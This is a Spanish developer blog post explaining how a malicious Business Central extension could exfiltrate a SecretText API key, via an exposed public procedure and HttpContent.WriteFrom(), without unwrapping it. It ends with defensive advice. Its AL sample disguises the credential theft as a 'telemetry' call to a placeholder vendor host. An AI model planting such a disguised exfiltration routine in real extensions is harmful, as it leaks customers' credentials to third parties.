---
id: secrettext-doesnt-need-to-be-read
title: Tu SecretText no necesita ser leído para ser robado
description: Cómo una extensión de terceros de Business Central podría robar tus credenciales sin desempaquetar ni leer nunca tu `SecretText`.
date: 2026-11-22
author: Guillermo Padilla Martin
---

Acabas de terminar de desarrollar una integración para Business Central.

Se conecta a una API externa, gestiona la autenticación y todo funciona a la perfección.

Por supuesto, necesitas un sitio donde guardar tu API key.

Y no vas a almacenarla en texto plano. Eres un desarrollador responsable.

Así que usas `SecretText`.

Te aseguras de que las credenciales no se expongan en el depurador, evitas conversiones innecesarias a `Text` y sigues las recomendaciones de Microsoft para manejar información sensible.

Y hay algo que te hace sentir especialmente bien con tu implementación.

**En Business Central SaaS, `SecretText.Unwrap()` no está soportado.**

```al
PlainText := MySecret.Unwrap();
```

Ni hablar.

Aunque otro fragmento de código obtenga tu variable `SecretText`, no puede simplemente desempaquetarla y leer el valor original.

Bien.

Has hecho los deberes. Tus credenciales están protegidas y puedes pasar a la siguiente tarea.

Pero hay algo de lo que creo que deberíamos hablar.

**¿Y si otra extensión no necesita leer tu secreto para robarlo?**

## No necesitas Unwrap()

¿Recuerdas esa integración que acabas de desarrollar?

En algún momento necesitaste enviar tu API key al servicio externo.

Y como estás usando `SecretText`, probablemente hiciste algo así:

```al
Headers := Client.DefaultRequestHeaders();
Headers.Add(
    'Authorization',
    SecretStrSubstNo('Bearer %1', ApiKey));
```

Nada raro, ¿verdad?

Estás pasando tu API key directamente a una cabecera HTTP de autorización sin convertirla a `Text` ordinario.

Esa es exactamente la forma en que deberían manejarse las credenciales.

Pero aquí hay algo que merece reflexión.

**¿Qué impide que otra extensión use esa misma credencial para enviar una petición a un servidor completamente distinto?**

No `SecretText`.

Y lo interesante es que ni siquiera necesita usar la credencial para autenticarse.

Puede simplemente enviar el secreto completo como cuerpo de la petición HTTP.

## Entra en escena otra extensión

Una de las mejores cosas de Business Central es su extensibilidad.

Un cliente puede tener aplicaciones de Microsoft, de su partner de implementación y de varios editores de terceros, todas ejecutándose en el mismo entorno.

Y, de forma natural, estas aplicaciones a veces necesitan interactuar.

Exponemos procedimientos, construimos interfaces y creamos funcionalidad que otras extensiones pueden usar.

Nada raro ahí.

Ahora imagina que has desarrollado una integración que se autentica contra un servicio externo.

Tu extensión guarda una API key en `IsolatedStorage` con ámbito de módulo y la recupera como `SecretText` cuando la necesita.

Hasta aquí, todo bien.

Pero en algún momento añades un procedimiento público para recuperar esa credencial.

Quizá otra integración la necesita. Quizá estaba pensado para uso interno y se dejó público por accidente.

Sea cual sea el motivo, tu codeunit contiene algo así:

```al
codeunit 50100 "External API Credentials"
{
    procedure GetApiKey() ApiKey: SecretText
    begin
        if not IsolatedStorage.Get(
            'ExternalApiKey',
            DataScope::Module,
            ApiKey)
        then
            Error('API key not configured.');
    end;
}
```

La credencial se almacena de forma segura.

Se recupera como `SecretText`.

Nunca se convierte a `Text` ordinario.

Parece bien, ¿verdad?

Excepto que hay un problema.

**Ese procedimiento es público.**

Otra extensión que referencie la tuya puede llamarlo y recibir la credencial.

Tu almacenamiento aislado no se ha comprometido. Tu extensión simplemente recuperó el secreto y se lo entregó a otra extensión.

Ahora quizá estés pensando:

*¿Quién expondría un procedimiento que devuelve una API key?*

Pregunta justa.

Este es un ejemplo simplificado, y exponer credenciales de esta forma es un error de diseño.

Pero ilustra algo importante: **proteger la representación de un secreto no significa que hayas protegido el acceso a él.**

Y una vez que otra extensión obtiene ese `SecretText`, las cosas se ponen mucho más interesantes.

## Tu secreto acaba de salir de Business Central

Imagina que una extensión de terceros tiene una dependencia sobre tu integración.

Puede llamar a `GetApiKey()` y tiene permiso para hacer peticiones HTTP salientes.

Esto es lo que podría hacer:

```al
codeunit 50200 "Integration Telemetry"
{
    procedure SendTelemetry()
    var
        Credentials: Codeunit "External API Credentials";
        Client: HttpClient;
        Content: HttpContent;
        Response: HttpResponseMessage;
        ApiKey: SecretText;
    begin
        ApiKey := Credentials.GetApiKey();

        Content.WriteFrom(ApiKey);

        Client.Post(
            'https://telemetry.vendor-example.com/api/collect',
            Content,
            Response);
    end;
}
```

Parece un procedimiento de telemetría corriente, ¿verdad?

Excepto que imagina que el endpoint pertenece a un editor malicioso.

La extensión no está enviando estadísticas de uso.

**Está enviando tu API key.**

¿Recuerdas cómo tu integración legítima usaba esa clave en una cabecera `Authorization`?

Esta extensión ni se molesta en eso.

Toma el `SecretText`, lo escribe directamente en el cuerpo de la petición HTTP con `HttpContent.WriteFrom()` y lo envía a su propio servidor.

Sin `Unwrap()`.

Sin conversión a `Text`.

Sin saltarse las restricciones de Microsoft.

Si la petición tiene éxito, el servidor receptor obtiene la credencial original.

**La extensión nunca necesitó leer la API key. Solo necesitaba un sitio adonde enviarla.**

Y aquí está la distinción importante.

Instalar una extensión de terceros no le da automáticamente acceso a todos los secretos de Business Central.

En nuestro ejemplo, la extensión maliciosa obtuvo la credencial porque la integración original exponía un procedimiento público que la devolvía.

Sin ese procedimiento, o sin otra vía accesible, este ataque no funcionaría.

**Un almacenamiento seguro no implica automáticamente un acceso seguro.**

## ¿No bloquearía Business Central la petición?

No necesariamente.

Business Central exige que las extensiones tengan habilitado **Allow HttpClient Requests** antes de hacer llamadas HTTP salientes.

Pero muchas integraciones legítimas necesitan este permiso, así que habilitarlo no es inusual.

Y aquí está la parte importante:

**No es una lista de destinos permitidos.**

Una vez habilitado, la extensión puede intentar comunicarse con otros endpoints, no solo con la API legítima de su editor.

Así que si una extensión maliciosa obtiene un `SecretText` y tiene HTTP saliente habilitado, ese ajuste de permisos por sí solo no impedirá que transmita la credencial.

## Entonces, ¿SecretText es realmente seguro?

Absolutamente.

Y por favor, no termines de leer esto pensando que deberías dejar de usar `SecretText`.

Hace exactamente lo que está diseñado para hacer: proteger valores sensibles de la exposición a través de la depuración y del manejo ordinario de texto, permitiendo al mismo tiempo pasarlos a las APIs soportadas.

Pero **proteger un secreto de ser leído no es lo mismo que controlar quién puede usarlo.**

Y esa es la distinción que quiero que los desarrolladores se lleven de esto.

## ¿Qué deberíamos hacer distinto?

No creo que necesitemos reinventar cómo desarrollamos integraciones.

Pero hay tres cosas a las que prestaría más atención.

**1. Mantén las credenciales aisladas.**

Si una API key pertenece exclusivamente a tu extensión, considera almacenarla en `IsolatedStorage` con ámbito de módulo. Recupérala como `SecretText` cuando la necesites y evita exponerla innecesariamente.

**2. Revisa tus APIs públicas.**

Busca procedimientos o interfaces que expongan credenciales o capacidades sensibles a otras extensiones.

Si otra extensión necesita interactuar con tu integración, considera exponer la operación concreta que necesita en lugar de devolver la credencial subyacente.

**3. Tómate en serio el acceso HTTP saliente.**

Una extensión con HTTP saliente habilitado puede comunicarse con servidores externos.

Eso no la hace maliciosa, pero es una capacidad a tener en cuenta al evaluar extensiones de terceros.

## Conclusión

Curiosamente, no descubrí esto investigando vulnerabilidades de seguridad.

Un compañero había olvidado una contraseña guardada como `SecretText`, y yo intenté ayudarle a recuperarla.

Por supuesto, `Unwrap()` no era una opción en Business Central SaaS.

Así que empecé a buscar otra forma de obtener el valor original.

Fue entonces cuando me di cuenta de algo: **en realidad no necesitaba leer la contraseña dentro de AL. Solo necesitaba enviarla a un sitio donde pudiera leerla.**

Y eso me llevó a `HttpContent.WriteFrom()`.

Lo que empezó como un intento de ayudar a un compañero a recuperar una contraseña olvidada me hizo ver que el mismo enfoque podría ser abusado por una extensión con acceso a las credenciales de otra persona.

`SecretText` hace exactamente lo que está diseñado para hacer. El error es asumir que hace más.

Porque **tu `SecretText` no necesita ser leído para ser robado.**

---

### Referencias

- [Microsoft Learn: Protecting sensitive values with SecretText](https://learn.microsoft.com/en-us/dynamics365/business-central/dev-itpro/developer/devenv-secret-text)
- [Microsoft Learn: SecretText.Unwrap()](https://learn.microsoft.com/en-us/dynamics365/business-central/dev-itpro/developer/methods-auto/secrettext/secrettext-unwrap-method)
- [Microsoft Learn: HttpHeaders.Add(Text, SecretText)](https://learn.microsoft.com/en-us/dynamics365/business-central/dev-itpro/developer/methods-auto/httpheaders/httpheaders-add-string-secrettext-method)
- [Microsoft Learn: HttpContent.WriteFrom(SecretText)](https://learn.microsoft.com/en-us/dynamics365/business-central/dev-itpro/developer/methods-auto/httpcontent/httpcontent-writefrom-secrettext-method)
- [Microsoft Learn: Isolated Storage](https://learn.microsoft.com/en-us/dynamics365/business-central/dev-itpro/developer/devenv-isolated-storage)
- [Microsoft Learn: HttpClient.Post()](https://learn.microsoft.com/en-us/dynamics365/business-central/dev-itpro/developer/methods-auto/httpclient/httpclient-post-method)
